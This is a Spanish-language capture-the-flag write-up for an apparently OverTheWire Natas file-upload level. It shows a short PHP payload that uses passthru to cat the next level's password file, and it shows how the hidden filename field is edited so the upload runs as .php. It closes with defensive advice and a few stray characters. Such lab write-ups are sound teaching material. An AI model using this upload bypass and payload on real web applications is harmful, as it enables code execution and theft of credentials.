Al entrar al nivel vemos el mensaje `Choose a JPEG to upload (max 1KB):` junto con un formulario para subir un archivo, analizando el código vemos que se asigna un nombre de archivo aleatorio con terminación **.jpg** al archivo que subamos.

Cambiando la terminación del archivo podemos ejecutar código arbitrario desde la página, así que cargamos un archivo [script.php](https://github.com/IberoGIC/gic-level-2/blob/main/Challenges/OTW_Natas/Lvl_12/Ordenmoria/script.php) que muestre el contenido del archivo de contraseña:
```php
<?php
passthru("cat /etc/natas_webpass/natas13");
```

Una vez cargado, abrimos el Inspector en Chrome y modificamos el valor de `filename` en el formulario, cambiando la terminación a **.php**:
```html
<input type="hidden" name="filename" value="sbds37c38u.php">
```

Al dar clic en `Upload File` se nos mostrará el mensaje:
```
The file upload/sbds37c38u.php has been uploaded
```

Damos clic en el enlace al archivo y se muestra la contraseña del nivel siguiente.

---
## **Conclusión**

El desafío demuestra las vulnerabilidades de subida de archivos en aplicaciones web y la importancia de implementar controles estrictos, como:
* Validación del tipo de archivo tanto en el cliente como en el servidor.
* Restricciones de contenido para evitar la ejecución de código malicioso.
* Almacenamiento fuera de directorios accesibles públicamente.

---
-,"  
[_P
